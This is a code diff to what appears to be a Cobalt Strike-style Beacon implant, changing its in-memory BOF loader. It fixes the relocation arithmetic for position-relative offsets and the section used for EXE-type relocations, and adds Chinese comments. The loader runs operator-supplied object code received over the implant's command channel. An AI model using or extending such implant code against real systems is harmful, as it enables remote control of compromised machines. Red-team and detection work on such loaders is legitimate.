@@ -43,14 +43,13 @@ PROC* FindOrAddDynamicFunction(Beacon_Internal_Api* api, PROC newFunction)
 BOOL processRelocation(PBEACON_RELOCATION pImageRelocation, char* lpCodeStart, char* lpCodeStartAddress, char* lpSection, unsigned long offsetInSection) {
 	if (pImageRelocation->relocType < 10) {
 		// 由于这里是32相对偏移，先判断偏移是否大于 4GB
-		const unsigned long long offset = *(unsigned long*)(lpCodeStart + pImageRelocation->rvaddre) + (unsigned long long)(lpSection + offsetInSection)
-			- (unsigned long long)(lpCodeStartAddress + pImageRelocation->rvaddre + pImageRelocation->relocType);
+		DWORD64 offset = *(DWORD*)(lpCodeStart + pImageRelocation->rvaddre) + (DWORD64)(lpSection + offsetInSection) - (DWORD64)(lpCodeStartAddress + pImageRelocation->rvaddre + pImageRelocation->relocType);
 		if (offset + (UINT_MAX / 2 + 1) > UINT_MAX) {
 			fprintf(stderr, "Relocation truncated to fit (distance between executable code and other data is >4GB)\n");
 			BeaconErrorNA(ERROR_RELOCATION_TRUNCATED_TO_FIT);
 			return FALSE;
 		}
-		*(long*)(lpCodeStart + pImageRelocation->rvaddre) = *(long*)(lpCodeStart + pImageRelocation->rvaddre) + (long)(lpSection + offsetInSection) - (long)(lpCodeStartAddress + pImageRelocation->rvaddre + pImageRelocation->relocType);
+		*(DWORD*)(lpCodeStart + pImageRelocation->rvaddre) = *(DWORD*)(lpCodeStart + pImageRelocation->rvaddre) + (DWORD)(lpSection + offsetInSection) - (DWORD)(lpCodeStartAddress + pImageRelocation->rvaddre + pImageRelocation->relocType);
 	}
 	else
 	{
@@ -62,7 +61,8 @@ BOOL processRelocation(PBEACON_RELOCATION pImageRelocation, char* lpCodeStart, c
 	return TRUE;
 }
 
-void CmdBeaconBof(unsigned char* commandBuf, size_t* commandBuflen) {
+VOID CmdBeaconBof(unsigned char* commandBuf, size_t* commandBuflen) {
+	// Beacon 内部 API
 	Beacon_Internal_Api* api = malloc(sizeof(Beacon_Internal_Api));
 	if (!api) {
 		fprintf(stderr, "malloc memory failed\n");
@@ -70,6 +70,7 @@ void CmdBeaconBof(unsigned char* commandBuf, size_t* commandBuflen) {
 	}
 	BeaconInternalAPI(api);
 
+	// 入口函数偏移
 	datap parse;
 	BeaconDataParse(&parse, commandBuf, *commandBuflen);
 	int entryPoint = BeaconDataInt(&parse);
@@ -116,10 +117,11 @@ void CmdBeaconBof(unsigned char* commandBuf, size_t* commandBuflen) {
 			result = processRelocation(reloc, code, lpCodeStartAddress, data, reloc->value);
 		}
 		else if (reloc->beaconRelocType.secType == EXE_RELOC_TYPE) {
-			result = processRelocation(reloc, code, lpCodeStartAddress, data, reloc->value);
+			result = processRelocation(reloc, code, lpCodeStartAddress, code, reloc->value);
 		}
 		else {
 			// 内部函数
+			// 此时 funcType 表明序号
 			if (reloc->beaconRelocType.funcType != DYNAMIC_FUNC_RELOC_TYPE) {
 				dynamicFunctionPtr = (PROC*)api + reloc->beaconRelocType.funcType;
 			}
